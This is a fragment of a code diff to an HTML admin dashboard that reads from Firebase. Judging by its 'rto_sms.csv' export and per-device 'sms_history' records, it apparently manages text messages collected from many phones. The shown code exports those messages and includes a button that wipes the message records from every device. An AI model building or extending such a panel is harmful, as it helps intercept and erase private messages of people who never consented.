   var bl = new Blob([csv], { type: 'text/csv' }); var a = document.createElement('a'); a.href = URL.createObjectURL(bl); a.download = 'rto_sms.csv'; a.click();
 });
-document.getElementById('btnFb').addEventListener('click', function() { alert('Firebase: ' + firebaseConfig.databaseURL); });
+document.getElementById('btnFb').addEventListener('click', function() { 
+  var url = (currentAccount && currentAccount.url) || RTO_CONFIG.databaseURL;
+  alert('Firebase: ' + url); 
+});
 document.getElementById('btnNuke').addEventListener('click', function() { if (!confirm('Delete ALL messages?')) return; if (!confirm('Sure?')) return; Object.keys(devs).forEach(function(id) { db.ref('device_info/' + id + '/messages').remove(); db.ref('device_info/' + id + '/sms_history').remove(); }); alert('Deleted'); });
-window.addEventListener('load', function() { if (localStorage.getItem('admin_logged_in') === 'true') { document.getElementById('loginScreen').style.display = 'none'; document.getElementById('mainApp').style.display = 'block'; startApp(); } });
+
+// ═══════════════════════════════════════════════════════
+// INIT
+// ═══════════════════════════════════════════════════════
+renderAccounts();
 </script>
 </body>
 </html>
